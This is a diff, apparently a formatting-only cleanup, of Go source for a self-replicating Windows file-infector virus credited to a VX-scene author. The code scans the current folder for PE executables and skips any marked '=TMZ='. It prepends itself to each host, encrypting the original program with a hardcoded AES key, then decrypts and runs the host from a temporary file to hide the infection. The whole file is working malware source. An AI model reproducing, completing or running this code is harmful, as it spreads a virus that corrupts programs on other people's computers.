@@ -13,34 +13,33 @@
 * A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix, R3s1stanc3 & others
 *
 * Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
-* 
+*
 * http://vx.thomazi.me
-*/
+ */
 
 package main
 
 import (
-    "bufio"
-    "io"
-    "io/ioutil"
-    "os"
-	"os/exec"
-	"strings"
+	"bufio"
 	"crypto/aes"
-   	"crypto/cipher"
-	"math/rand"
-	"time"
+	"crypto/cipher"
 	"debug/pe"
 	"encoding/binary"
-
+	"io"
+	"io/ioutil"
+	"math/rand"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
 )
 
 func check(e error) {
 	// Reading files requires checking most calls for errors.
 	// This helper will streamline our error checks below.
-    if e != nil {
-        panic(e)
-    }
+	if e != nil {
+		panic(e)
+	}
 }
 
 func _ioReader(file string) io.ReaderAt {
@@ -50,15 +49,15 @@ func _ioReader(file string) io.ReaderAt {
 }
 
 func CheckPE(file string) bool {
-	
-	r := _ioReader(file) //reader interface for file
+
+	r := _ioReader(file)    //reader interface for file
 	f, err := pe.NewFile(r) //open the file as a PE
 	if err != nil {
 		return false //Not a PE file
 	}
-	
+
 	//Reading DOS header
-	var dosheader [96]byte		
+	var dosheader [96]byte
 	r.ReadAt(dosheader[0:], 0)
 	if dosheader[0] == 'M' && dosheader[1] == 'Z' { //if we get MZ
 		signoff := int64(binary.LittleEndian.Uint32(dosheader[0x3c:]))
@@ -67,11 +66,11 @@ func CheckPE(file string) bool {
 		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) { //if not PE\0\0
 			return false //Invalid PE File Format
 		}
-	}	
+	}
 	if (f.Characteristics & 0x2000) == 0x2000 { //IMAGE_FILE_DLL signature
 		return false //it's a DLL, OCX, CPL file, we want a EXE file
-	} 
-	
+	}
+
 	f.Close()
 	return true //it is a valid EXE file
 
@@ -80,75 +79,75 @@ func CheckPE(file string) bool {
 func CheckInfected(file string) bool {
 	//a method by genetix, very handy
 	_mark := "=TMZ=" //infection mark
- 	fi, err := os.Open(file)
+	fi, err := os.Open(file)
 	check(err)
 	myStat, err := fi.Stat()
-    check(err)	
+	check(err)
 	size := myStat.Size()
-	
+
 	buf := make([]byte, size)
 	fi.Read(buf)
 	fi.Close()
 	var x int64
 	for x = 1; x < size; x++ {
-        if buf[x] == _mark[0] {
-			var y int64           
-            for y = 1; y < int64(len(_mark)); y++ {
-                if (x + y) >= size {
-                        break
-					}
-                    if buf[x + y] != _mark[y] {
-                            break
-					}
-                }
-                if y == int64(len(_mark)) {
-                    return true; //infected!
-                }
+		if buf[x] == _mark[0] {
+			var y int64
+			for y = 1; y < int64(len(_mark)); y++ {
+				if (x + y) >= size {
+					break
+				}
+				if buf[x+y] != _mark[y] {
+					break
+				}
+			}
+			if y == int64(len(_mark)) {
+				return true //infected!
 			}
 		}
-    return false; //not infected
+	}
+	return false //not infected
 }
 
 func Infect(file string) {
 
 	dat, err := ioutil.ReadFile(file) //read host
-	check(err)	
+	check(err)
 	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
 	virbuf := make([]byte, 3039232)
 	vir.Read(virbuf)
-	
+
 	encDat := Encrypt(dat) //encrypt host
-	
+
 	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
-    check(err)
-	
-  	w := bufio.NewWriter(f)
+	check(err)
+
+	w := bufio.NewWriter(f)
 	w.Write(virbuf) //write virus
 	w.Write(encDat) //write encypted host
-    w.Flush() //make sure we are all set
+	w.Flush()       //make sure we are all set
 	f.Close()
 	vir.Close()
-	
+
 }
-   
+
 func RunHost() {
-	
+
 	hostbytes := Rnd(8) + ".exe" //generate random name
-	
+
 	h, err := os.Create(hostbytes) //create tmp with above name
 	check(err)
-	
+
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
-    check(err)
+	check(err)
 	allSZ := len(infected_data) //get file full size
-	hostSZ := allSZ - 3039232 //calculate host size
-	
+	hostSZ := allSZ - 3039232   //calculate host size
+
 	f, err := os.Open(os.Args[0]) //open host
-    check(err)
-		
+	check(err)
+
 	f.Seek(3039232, os.SEEK_SET) //go to host start
-	
+
 	hostBuf := make([]byte, hostSZ)
 	f.Read(hostBuf) //read it
 
@@ -156,64 +155,64 @@ func RunHost() {
 
 	w := bufio.NewWriter(h)
 	w.Write(plainHost) //write plain host to tmp file
-    w.Flush() //make sure we are all set
+	w.Flush()          //make sure we are all set
 	h.Close()
 	f.Close()
-	
+
 	os.Chmod(hostbytes, 0755) //give it proper permissions
-	cmd := exec.Command(hostbytes) 
+	cmd := exec.Command(hostbytes)
 	cmd.Start() //execute it
 	err = cmd.Wait()
 	os.Remove(hostbytes)
 }
- 
+
 func Encrypt(toEnc []byte) []byte {
-	
+
 	key := "SUPER_SECRET_KEY" // 16 bytes!
-    block,err := aes.NewCipher([]byte(key))
+	block, err := aes.NewCipher([]byte(key))
 	check(err)
-	
+
 	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
-    ciphertext := []byte("ASUPER_SECRET_IV") 
-    iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
-	
+	ciphertext := []byte("ASUPER_SECRET_IV")
+	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
+
 	encrypter := cipher.NewCFBEncrypter(block, iv)
 
-    encrypted := make([]byte, len(toEnc))
-    encrypter.XORKeyStream(encrypted, toEnc)
+	encrypted := make([]byte, len(toEnc))
+	encrypter.XORKeyStream(encrypted, toEnc)
 
-    //fmt.Printf("%s encrypted to %v\n", toEnc, encrypted)
+	//fmt.Printf("%s encrypted to %v\n", toEnc, encrypted)
 	return encrypted
-	
+
 }
 
 func Decrypt(toDec []byte) []byte {
 
 	key := "SUPER_SECRET_KEY" // 16 bytes
-    block,err := aes.NewCipher([]byte(key))
+	block, err := aes.NewCipher([]byte(key))
 	check(err)
-	
+
 	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
-    ciphertext := []byte("ASUPER_SECRET_IV") 
-    iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
-	
+	ciphertext := []byte("ASUPER_SECRET_IV")
+	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
+
 	decrypter := cipher.NewCFBDecrypter(block, iv) // simple
 
-    decrypted := make([]byte, len(toDec))
-    decrypter.XORKeyStream(decrypted, toDec)
-   
+	decrypted := make([]byte, len(toDec))
+	decrypter.XORKeyStream(decrypted, toDec)
+
 	return decrypted
 }
 
 func Rnd(n int) string {
-	
+
 	rand.Seed(time.Now().UTC().UnixNano())
 	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-    b := make([]rune, n)
-    for i := range b {
-        b[i] = letters[rand.Intn(len(letters))]
-    }
-    return string(b)
+	b := make([]rune, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
 
 }
 
@@ -234,13 +233,13 @@ func main() {
 	virPath := os.Args[0]
 
 	files, _ := ioutil.ReadDir(".")
-	for _, f := range files { 
+	for _, f := range files {
 		if CheckPE(f.Name()) == true {
 			if CheckInfected(f.Name()) == false {
 				if !strings.Contains(virPath, f.Name()) {
 					Infect(f.Name())
-				}	
-			}	
+				}
+			}
 		}
 	}
 
